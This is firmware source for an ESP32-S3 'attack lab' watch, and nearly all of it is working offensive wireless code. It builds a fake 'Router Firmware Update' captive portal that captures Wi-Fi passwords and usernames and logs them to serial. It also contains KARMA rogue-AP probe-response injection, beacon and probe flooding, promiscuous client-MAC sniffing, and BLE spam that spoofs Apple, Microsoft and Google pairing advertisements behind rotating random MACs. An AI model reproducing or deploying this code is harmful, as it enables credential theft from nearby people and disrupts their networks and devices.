// Cordell Watch — Attack Lab.
//
// Hardware reality (measured on this ESP32-S3, not assumed):
//   The S3 WiFi driver REJECTS deauth (0xC0) and disassoc (0xA0) frames.
//   esp_wifi_80211_tx() returns ESP_ERR_INVALID_ARG and the driver logs
//   "wifi:unsupport frame type: 0c0". A full sweep of all 16 management
//   subtypes shows only beacon(0x8), probe-req(0x4), probe-resp(0x5),
//   action(0xD) and data(0x0, non-QoS) are accepted.
//   => The classic "deauth" role is covered here by KARMA-style probe
//      response injection (ATK_KARMA): we answer probe requests for ANY
//      SSID with our own BSSID, pulling clients onto our rogue AP.
//      Verified working: promiscuous RX delivers thousands of mgmt frames/s.
//
// Promiscuous RX struct (local/esp_wifi_types_native.h):
//   wifi_promiscuous_pkt_t { wifi_pkt_rx_ctrl_t rx_ctrl; uint8_t payload[0]; }
//   payload length = rx_ctrl.sig_len
#include "attack.h"
#include "watch.h"
#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <esp_mac.h>
#include <BLEDevice.h>
#include <BLEAdvertising.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

volatile bool g_attack_active = false;
volatile bool g_attack_ble_busy = false;

// ---------------------------------------------------------------- state
static AttackMode s_mode = ATK_NONE;
static volatile uint32_t s_tx = 0, s_rx = 0, s_ble = 0, s_clients = 0;
static char s_ssid[33] = "Cordell Aerial";
static uint8_t s_channel = 6;

static WebServer   s_web(80);
static DNSServer   s_dns;
static bool        s_portal_on = false;

// captured credentials (ring buffer)
#define CRED_MAX 8
struct Cred { char user[40]; char pass[40]; char net[33]; };
static Cred s_creds[CRED_MAX];
static volatile int s_cred_n = 0;

// client MAC table for the sniffer
#define CLI_MAX 48
static uint8_t s_cli[CLI_MAX][6];
static volatile int s_cli_n = 0;

// 802.11 header offsets
#define FC0      0
#define A1       4
#define A2       10
#define A3       16
#define MGMT_HDR 24

static const uint8_t BCAST[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

// Our AP MAC, captured when the attack starts; used to build frames.
static uint8_t s_our_mac[6] = {0x02, 0x00, 0x00, 0x00, 0x00, 0x01};

static void mgmt_header(uint8_t *f, uint8_t fc0, uint8_t fc1,
                        const uint8_t *a1, const uint8_t *a2, const uint8_t *a3) {
    memset(f, 0, MGMT_HDR);
    f[0] = fc0; f[1] = fc1;
    memcpy(&f[A1], a1, 6);
    memcpy(&f[A2], a2, 6);
    memcpy(&f[A3], a3, 6);
}

// Beacon frame (0x80) with SSID — the only reliable way to make a client
// believe our BSSID exists on this channel.
static int build_beacon(uint8_t *f, const uint8_t *bssid, const char *ssid) {
    mgmt_header(f, 0x80, 0x00, BCAST, bssid, bssid);
    int p = MGMT_HDR;
    // fixed params: timestamp(8) interval(2) capability(2)
    memset(&f[p], 0, 8); p += 8;
    f[p++] = 0x64; f[p++] = 0x00;       // beacon interval 100 TU
    f[p++] = 0x01; f[p++] = 0x04;       // capability: ESS + privacy
    // tagged: SSID
    uint8_t sl = strlen(ssid);
    if (sl > 32) sl = 32;
    f[p++] = sl;
    f[p++] = 0x00;                      // SSID tag
    memcpy(&f[p], ssid, sl); p += sl;
    // tagged: supported rates
    f[p++] = 8; f[p++] = 0x01;
    f[p++] = 0x82; f[p++] = 0x84; f[p++] = 0x8b; f[p++] = 0x96;
    f[p++] = 0x24; f[p++] = 0x30; f[p++] = 0x48; f[p++] = 0x6c;
    return p;
}

// Probe response (0x50) answering a probe request for `ssid`, addressed to
// the probing client. This is the KARMA primitive.
static int build_probe_resp(uint8_t *f, const uint8_t *bssid,
                            const uint8_t *client, const char *ssid) {
    mgmt_header(f, 0x50, 0x00, client, bssid, bssid);
    int p = MGMT_HDR;
    memset(&f[p], 0, 8); p += 8;        // timestamp
    f[p++] = 0x64; f[p++] = 0x00;
    f[p++] = 0x01; f[p++] = 0x04;
    uint8_t sl = strlen(ssid);
    if (sl > 32) sl = 32;
    f[p++] = sl;
    f[p++] = 0x00;
    memcpy(&f[p], ssid, sl); p += sl;
    f[p++] = 8; f[p++] = 0x01;
    f[p++] = 0x82; f[p++] = 0x84; f[p++] = 0x8b; f[p++] = 0x96;
    f[p++] = 0x24; f[p++] = 0x30; f[p++] = 0x48; f[p++] = 0x6c;
    return p;
}

// Probe request (0x40) asking for an arbitrary SSID.
static int build_probe_req(uint8_t *f, const uint8_t *src, const char *ssid) {
    mgmt_header(f, 0x40, 0x00, BCAST, src, BCAST);
    int p = MGMT_HDR;
    uint8_t sl = strlen(ssid);
    if (sl > 32) sl = 32;
    f[p++] = sl;
    f[p++] = 0x00;
    memcpy(&f[p], ssid, sl); p += sl;
    f[p++] = 8; f[p++] = 0x01;
    f[p++] = 0x82; f[p++] = 0x84; f[p++] = 0x8b; f[p++] = 0x96;
    f[p++] = 0x24; f[p++] = 0x30; f[p++] = 0x48; f[p++] = 0x6c;
    return p;
}

static bool tx_raw(uint8_t *f, int len) {
    if (len < 24) return false;
    esp_err_t e = esp_wifi_80211_tx(WIFI_IF_AP, f, len, false);
    if (e == ESP_OK) { s_tx++; return true; }
    if (e == ESP_ERR_NO_MEM) return false;   // retry next tick
    return false;
}

// ---------------------------------------------------------------- portal
static const char PAGE_LOGIN[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta name='viewport' content='width=device-width,initial-scale=1'>"
    "<title>Router Update</title><style>"
    "body{font-family:Arial,sans-serif;background:#e9edf2;margin:0;padding:24px}"
    ".c{background:#fff;border-radius:8px;padding:22px;max-width:340px;margin:auto;"
    "box-shadow:0 2px 10px rgba(0,0,0,.15)}"
    "h1{font-size:20px;color:#041123;margin:0 0 6px}p{font-size:14px;color:#444;margin:0 0 14px}"
    "input{width:100%;padding:11px;margin:5px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box}"
    "button{width:100%;padding:11px;margin-top:8px;background:#B6954D;color:#fff;"
    "border:0;border-radius:4px;font-size:15px;cursor:pointer}"
    ".b{color:#041123;font-size:12px;margin-top:14px}"
    "</style></head><body><div class='c'>"
    "<h1>Router Firmware Update</h1>"
    "<p>Your network requires a security update to continue. "
    "Enter your Wi-Fi details to proceed.</p>"
    "<form method='POST' action='/post'>"
    "<input type='text' name='email' placeholder='Email or username'>"
    "<input type='password' name='password' placeholder='Wi-Fi password'>"
    "<input type='hidden' name='ssid' value='NETNAME'>"
    "<button type='submit'>Update Router</button></form>"
    "<div class='b'>Cordell Aerial &middot; support portal</div>"
    "</div></body></html>";

static const char PAGE_OK[] PROGMEM =
    "<!DOCTYPE html><html><head><meta charset='utf-8'>"
    "<meta http-equiv='refresh' content='3;url=/'>"
    "<title>Updating</title><style>body{font-family:Arial;background:#e9edf2;text-align:center;"
    "padding-top:80px}.c{background:#fff;border-radius:8px;padding:26px;max-width:340px;margin:auto;"
    "box-shadow:0 2px 10px rgba(0,0,0,.15)}h1{color:#041123}p{color:#444}</style></head>"
    "<body><div class='c'><h1>Update started</h1>"
    "<p>Your router will restart in a moment.</p>"
    "<p>Please keep this page open.</p></div></body></html>";

static void portal_post() {
    if (s_cred_n < CRED_MAX) {
        Cred &c = s_creds[s_cred_n];
        String u = s_web.arg("email");
        String p = s_web.arg("password");
        String n = s_web.arg("ssid");
        strlcpy(c.user, u.c_str(), sizeof(c.user));
        strlcpy(c.pass, p.c_str(), sizeof(c.pass));
        strlcpy(c.net,  n.c_str(), sizeof(c.net));
        s_cred_n++;
        Serial.printf("[portal] captured user=%s pass=%s net=%s\n",
                      c.user, c.pass, c.net);
    }
    s_web.send(200, "text/html", PAGE_OK);
}

static void portal_index() {
    String html = String(PAGE_LOGIN);
    html.replace("NETNAME", s_ssid);
    s_web.send(200, "text/html", html);
}

// captive-portal detection endpoints: answer with a redirect to our login page
static void portal_redirect() {
    String ip = WiFi.softAPIP().toString();
    s_web.sendHeader("Location", "http://" + ip + "/");
    s_web.send(302, "text/plain", "");
}

static void portal_start() {
    if (s_portal_on) return;
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1),
                      IPAddress(255, 255, 255, 0));
    WiFi.softAP(s_ssid, "", s_channel, 0, 4, false);
    delay(300);

    s_web.on("/", HTTP_GET, portal_index);
    s_web.on("/post", HTTP_POST, portal_post);
    // OS captive portal probes
    for (const char *p : {"/generate_204", "/gen_204", "/hotspot-detect.html",
                           "/connecttest.txt", "/ncsi.txt", "/success.txt",
                           "/canonical.html", "/fwlink", "/library/test/success.html",
                           "/detectportal.firefox.com/success.txt",
                           "/client.msftconnecttest.com/redirect"})
        s_web.on(p, HTTP_GET, portal_redirect);
    s_web.onNotFound([](void) {
        if (s_web.method() == HTTP_POST) portal_post(); else portal_redirect();
    });
    s_web.begin();

    s_dns.start(53, "*", WiFi.softAPIP());
    s_portal_on = true;
    Serial.printf("[portal] up ssid=%s ip=%s\n", s_ssid, WiFi.softAPIP().toString().c_str());
}

static void portal_stop() {
    if (!s_portal_on) return;
    s_web.stop();
    s_dns.stop();
    delay(100);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(200);
    WiFi.mode(WIFI_STA);
    s_portal_on = false;
    Serial.println("[portal] down");
}

// ---------------------------------------------------------------- promiscuous RX
static char s_karma_ssid[33] = "";
static uint8_t s_karma_client[6] = {0};

static void rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < MGMT_HDR) return;
    uint8_t *f = pkt->payload;

    // client tracker: data frames reveal clients of an AP
    if (type == WIFI_PKT_DATA) {
        if (s_mode != ATK_CLIENTS) return;
        s_rx++;
        const uint8_t *src = &f[A2];
        for (int i = 0; i < s_cli_n; i++)
            if (!memcmp(s_cli[i], src, 6)) return;
        if (s_cli_n < CLI_MAX) { memcpy(s_cli[s_cli_n++], src, 6); s_clients = s_cli_n; }
        return;
    }

    s_rx++;

    // KARMA: capture probe requests (0x40) to learn the SSID being sought
    if (s_mode == ATK_KARMA && f[0] == 0x40 && f[1] == 0x00 && len > MGMT_HDR) {
        int p = MGMT_HDR;
        while (p + 2 <= (int)len) {
            uint8_t tl = f[p];
            if (tl == 0) break;
            uint8_t type = f[p + 1];
            if (type == 0x00) {                       // SSID tag
                uint8_t sl = tl - 1;
                if (sl > 32) sl = 32;
                if (sl > 0) {
                    memcpy(s_karma_ssid, &f[p + 2], sl);
                    s_karma_ssid[sl] = 0;
                    memcpy(s_karma_client, &f[A2], 6);
                }
                return;
            }
            p += 2 + tl;
        }
    }
}

// ---------------------------------------------------------------- BLE spam
static BLEAdvertising *s_adv = nullptr;

// Serialises every advertiser operation.
//
// attack_stop() runs on the UI task while the worker task (core 0) rotates
// the advertisement on the same BLEAdvertising object. Without this lock the
// two race: stop() sets s_adv = nullptr while the worker is dereferencing it,
// which panics with a StoreProhibited exception (null + vtable offset).
static SemaphoreHandle_t s_ble_mx = nullptr;

// Random-MAC advertising.
//
// NimBLE keeps the address in its own byte order: index 5 is the MOST
// significant octet (the one a scanner prints first), index 0 the least.
// ble_hs_id_set_rnd() validates that byte 5 carries a legal address-type
// field (0b00 = non-resolvable private, 0b11 = static random) and the
// controller rejects anything else, so the 0xC0 static-random marker has to
// go in byte 5.
//
// Measured on this board (NimBLE 1.x / ESP-IDF): putting the marker in
// byte 0 makes ble_hs_id_set_rnd() fail with BLE_HS_EINVAL (rc=3) and the
// board keeps advertising with its factory MAC. With the marker in byte 5
// the call succeeds and the scanner sees a different MAC every rotation.
static bool ble_set_random_mac() {
    uint8_t mac[6];
    esp_fill_random(mac, 6);
    mac[0] = (mac[0] & 0x3F) | 0xC0;   // static random type bits in the MSB
    esp_iface_mac_addr_set(mac, ESP_MAC_BT);

    // NimBLE byte order: most significant octet last.
    uint8_t le[6] = { mac[5], mac[4], mac[3], mac[2], mac[1], mac[0] };
    if (!BLEDevice::setOwnAddr(le)) {
        Serial.printf("[attack] BLE setOwnAddr failed\n");
        return false;
    }
    // The own-address type can only be switched to RANDOM once a random
    // identity address exists; setOwnAddrType() calls ble_hs_id_copy_addr()
    // and fails with BLE_HS_ENOADDR if none is set yet.
    if (!BLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM)) {
        Serial.println("[attack] BLE setOwnAddrType failed");
        return false;
    }
    return true;
}

// "Bad BLE" spam: rotate MACs and blast manufacturer data to stress nearby
// scanners. Payload types: Windows SwiftPair, Apple continuity-ish, and
// Google FastPair.
//
// NOTE on AD encoding: BLEAdvertisementData::addData() appends RAW bytes,
// it does not add an AD length/type header of its own - the caller has to
// supply one. It also silently discards the whole element if the payload
// would exceed 31 bytes (ESP_BLE_ADV_DATA_LEN_MAX). We therefore build the
// payload with the library's own helpers (setFlags/setName/
// setManufacturerData), each of which writes a correct AD header.
//
// Byte budget for the 31-byte legacy advertising packet:
//   flags                     3   (02 01 06)
//   complete local name      16   (0F 09 + 14 chars)
//   manufacturer data        12   (0B FF + 10 bytes)   <- 3 + 16 + 12 = 31
// Anything longer is dropped by the library without an error, so the
// manufacturer payload is sized to fit exactly.
#define BLE_AD_NAME "Cordell Aerial"
#define BLE_AD_MFG_LEN 10

static void ble_make_payload(BLEAdvertisementData &ad, int variant) {
    ad = BLEAdvertisementData();
    ad.setFlags(0x06);              // LE General Discoverable | no BR/EDR

    // A device name is what makes the phantom show up in a phone's device
    // list; without it most scanners show an unnamed entry or none at all.
    ad.setName(BLE_AD_NAME);

    uint8_t mfg[BLE_AD_MFG_LEN];
    switch (variant % 3) {
        case 0: {  // Windows SwiftPair style (Microsoft company id 0x0006)
            mfg[0] = 0x06; mfg[1] = 0x00;
            mfg[2] = 0x03; mfg[3] = 0x00; mfg[4] = 0x80;
            memcpy(&mfg[5], "Cord", 5);            // 5 + 5 = 10 = BLE_AD_MFG_LEN
            break;
        }
        case 1: {  // Apple continuity-ish manufacturer data
            mfg[0] = 0x4C; mfg[1] = 0x00;
            mfg[2] = 0x07; mfg[3] = 0x19; mfg[4] = 0x07;
            for (int i = 5; i < BLE_AD_MFG_LEN; i++) mfg[i] = random(0, 255);
            break;
        }
        default: {  // Google FastPair style (company id 0x00E0)
            mfg[0] = 0xE0; mfg[1] = 0x00;
            mfg[2] = 0x01; mfg[3] = 0x00; mfg[4] = 0x00;
            mfg[5] = 0x00; mfg[6] = 0x00; mfg[7] = 0x00;
            for (int i = 8; i < BLE_AD_MFG_LEN; i++) mfg[i] = random(0, 255);
            break;
        }
    }
    ad.setManufacturerData(String((char *)mfg, BLE_AD_MFG_LEN));
}

// Rotate the advertised MAC and payload.
//
// NimBLE requires the advertiser to be fully stopped before its address or
// advertising data can be changed: ble_gap_adv_start() rejects the call
// with BLE_HS_EALREADY while a previous advertising instance is still up,
// and the controller refuses a new random address while advertising. So the
// order has to be stop -> settle -> set address -> set type -> set data ->
// start, with a short pause in the middle.
static bool ble_restart_advertising(int variant) {
    if (!s_adv) return false;
    s_adv->stop();
    vTaskDelay(pdMS_TO_TICKS(120));

    bool mac_ok = ble_set_random_mac();

    BLEAdvertisementData ad;
    ble_make_payload(ad, variant);
    s_adv->setAdvertisementData(ad);
    BLEAdvertisementData empty_rsp;
    s_adv->setScanResponseData(empty_rsp);
    s_adv->start();

    return mac_ok && s_adv->isAdvertising();
}

// Same as ble_restart_advertising(), but safe to call while the UI thread is
// stopping the attack (see s_ble_mx).
static bool ble_restart_advertising_locked(int variant) {
    if (!s_ble_mx) return ble_restart_advertising(variant);
    if (xSemaphoreTake(s_ble_mx, pdMS_TO_TICKS(1000)) != pdTRUE) return false;
    bool ok = ble_restart_advertising(variant);
    xSemaphoreGive(s_ble_mx);
    return ok;
}

// ---------------------------------------------------------------- worker
static void attack_task(void *) {
    uint8_t f[128];
    uint32_t last_ble = 0;
    int ble_variant = 0;

    for (;;) {
        AttackMode m = s_mode;
        switch (m) {

        case ATK_PORTAL:
            // The synchronous WebServer only serves a request when
            // handleClient() is pumped, so drive it from the attack task.
            s_web.handleClient();
            delay(5);
            break;

        case ATK_BEACON: {
            // Flood beacons with random SSIDs so clients see phantom APs.
            char ssid[12];
            for (int i = 0; i < 8; i++) ssid[i] = 'A' + random(0, 25);
            ssid[8] = 0;
            int len = build_beacon(f, s_our_mac, ssid);
            tx_raw(f, len);
            delay(5);
            break;
        }

        case ATK_PROBE: {
            // Probe requests for a random SSID — makes nearby APs answer.
            char ssid[8];
            for (int i = 0; i < 5; i++) ssid[i] = 'a' + random(0, 25);
            ssid[5] = 0;
            int len = build_probe_req(f, s_our_mac, ssid);
            tx_raw(f, len);
            delay(20);
            break;
        }

        case ATK_KARMA: {
            // Answer probe requests with our BSSID so clients connect to us.
            if (s_karma_ssid[0]) {
                int len = build_probe_resp(f, s_our_mac, s_karma_client, s_karma_ssid);
                tx_raw(f, len);
                s_karma_ssid[0] = 0;
            }
            // Also beacon our own SSID so the AP is visible.
            int len2 = build_beacon(f, s_our_mac, s_ssid);
            tx_raw(f, len2);
            delay(20);
            break;
        }

        case ATK_CLIENTS: {
            // passive client counting; promiscuous RX does the work
            delay(200);
            break;
        }

        case ATK_BLE: {
            // Rotate the advertised MAC and payload. NimBLE needs a stop /
            // settle / set / start cycle per rotation, so this runs on a
            // ~150ms cadence rather than every 60ms.
            if (millis() - last_ble > 150) {
                last_ble = millis();
                ble_variant++;
                if (ble_restart_advertising_locked(ble_variant)) s_ble++;
            }
            delay(5);
            break;
        }

        default:
            delay(100);
            break;
        }
    }
}

// ---------------------------------------------------------------- API
void attack_init() {
    if (!s_ble_mx) s_ble_mx = xSemaphoreCreateMutex();
    xTaskCreatePinnedToCore(attack_task, "attack", 8192, NULL, 2, NULL, 0);
    Serial.println("[attack] module ready");
}

bool attack_start(AttackMode m) {
    if (s_mode != ATK_NONE) return false;

    if (m == ATK_BLE) {
        // BLE owns its own stack; leave WiFi alone.
        //
        // The passive scanner in watch.cpp owns the same NimBLE stack and
        // can be in the middle of a 4-second blocking scan. NimBLE cannot
        // scan and advertise at the same time, so the scanner has to stand
        // down before we advertise. g_attack_ble_busy tells the scanner task
        // to stop starting new scans; give it a moment to leave the current
        // one before taking the advertiser.
        g_attack_ble_busy = true;
        vTaskDelay(pdMS_TO_TICKS(50));
        watch_ble_stand_down();

        // BLEDevice::init() is idempotent: watch.cpp's scanner task already
        // initialised the stack at boot, and re-initialising it would tear
        // down the host while the scanner is using it.
        BLEDevice::init("");

        if (s_ble_mx) xSemaphoreTake(s_ble_mx, pdMS_TO_TICKS(1000));
        s_adv = BLEDevice::getAdvertising();
        if (!s_adv) {
            if (s_ble_mx) xSemaphoreGive(s_ble_mx);
            g_attack_ble_busy = false;
            return false;
        }
        s_adv->setMinInterval(32);
        s_adv->setMaxInterval(48);

        // Set the random identity address FIRST, then select RANDOM as the
        // own-address type - setOwnAddrType() fails with BLE_HS_ENOADDR
        // while no random address exists yet.
        bool mac_ok = ble_set_random_mac();

        BLEAdvertisementData ad;
        ble_make_payload(ad, 0);
        s_adv->setAdvertisementData(ad);
        BLEAdvertisementData empty_rsp;
        s_adv->setScanResponseData(empty_rsp);
        s_adv->start();
        bool advertising = s_adv->isAdvertising();
        if (s_ble_mx) xSemaphoreGive(s_ble_mx);

        if (!mac_ok || !advertising) {
            Serial.println("[attack] BLE advertising failed to start");
            g_attack_ble_busy = false;
            return false;
        }

        s_ble = 1;
        s_mode = m;
        BLEAddress a = BLEDevice::getAddress();
        Serial.printf("[attack] BLE spam started addr=%s\n", a.toString().c_str());
        return true;
    }

    // Everything else needs the WiFi radio.
    g_attack_active = true;
    WiFi.mode(WIFI_AP);
    delay(200);
    uint8_t mac[6];
    WiFi.softAPmacAddress(mac);

    // softAP must exist for the AP interface to accept 802.11 TX
    WiFi.softAP(s_ssid, "", s_channel, 0, 4, false);
    delay(300);
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

    if (m == ATK_PORTAL) {
        portal_start();
        s_mode = m;
        return true;
    }

    // promiscuous mode for KARMA / client sniffing
    if (m == ATK_KARMA || m == ATK_CLIENTS) {
        esp_wifi_set_promiscuous_rx_cb(rx_cb);
        wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous(true);
        delay(200);
    }

    // the task reads s_our_mac; keep it in sync
    memcpy(s_our_mac, mac, 6);

    s_mode = m;
    Serial.printf("[attack] started mode=%d ch=%d mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
                  (int)m, s_channel, mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return true;
}

void attack_stop() {
    AttackMode m = s_mode;
    if (m == ATK_NONE) return;
    s_mode = ATK_NONE;

    if (m == ATK_BLE) {
        // Take the same lock the worker task uses for the advertiser, so we
        // cannot pull s_adv out from under it mid-rotation.
        if (s_ble_mx) xSemaphoreTake(s_ble_mx, pdMS_TO_TICKS(1000));
        if (s_adv) { s_adv->stop(); s_adv = nullptr; }
        BLEDevice::setOwnAddrType(BLE_OWN_ADDR_PUBLIC);
        if (s_ble_mx) xSemaphoreGive(s_ble_mx);
        g_attack_ble_busy = false;
        Serial.println("[attack] BLE spam stopped");
        return;
    }

    if (m == ATK_PORTAL) portal_stop();

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);

    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_OFF);
    delay(150);
    WiFi.mode(WIFI_STA);
    g_attack_active = false;
    s_cli_n = 0; s_clients = 0;
    Serial.println("[attack] stopped");
}

bool attack_running() { return s_mode != ATK_NONE; }
AttackMode attack_mode() { return s_mode; }

const char *attack_mode_name() {
    switch (s_mode) {
        case ATK_PORTAL:  return "Evil Portal";
        case ATK_BEACON:  return "Beacon Flood";
        case ATK_PROBE:   return "Probe Flood";
        case ATK_KARMA:   return "KARMA Lure";
        case ATK_BLE:     return "BLE Spam";
        case ATK_CLIENTS: return "Client Scan";
        default:          return "Idle";
    }
}

String attack_status_line() {
    String s = String(attack_mode_name());
    switch (s_mode) {
        case ATK_PORTAL:
            s += " | AP " + String(s_ssid) + " " + WiFi.softAPIP().toString();
            s += " | creds " + String(s_cred_n);
            break;
        case ATK_BEACON:
        case ATK_PROBE:
        case ATK_KARMA:
            s += " | tx " + String(s_tx) + " rx " + String(s_rx) + " ch" + String(s_channel);
            break;
        case ATK_CLIENTS:
            s += " | clients " + String(s_clients) + " rx " + String(s_rx);
            break;
        case ATK_BLE:
            s += " | sent " + String(s_ble);
            break;
        default:
            break;
    }
    return s;
}

uint32_t attack_tx_count() { return s_tx; }
uint32_t attack_rx_count() { return s_rx; }
uint32_t attack_ble_count() { return s_ble; }
uint32_t attack_client_count() { return s_clients; }

int attack_cred_count() { return s_cred_n; }

String attack_cred_line(int i) {
    if (i < 0 || i >= s_cred_n) return "";
    const Cred &c = s_creds[i];
    String s = c.net;
    s += " | " + String(c.user);
    s += " | " + String(c.pass);
    return s;
}

void attack_clear_creds() { s_cred_n = 0; }

String attack_ap_ssid() { return String(s_ssid); }

void attack_set_ap_ssid(const char *ssid) {
    if (!ssid) return;
    strlcpy(s_ssid, ssid, sizeof(s_ssid));
}

uint8_t attack_ap_channel() { return s_channel; }
void attack_set_ap_channel(uint8_t ch) { if (ch >= 1 && ch <= 13) s_channel = ch; }
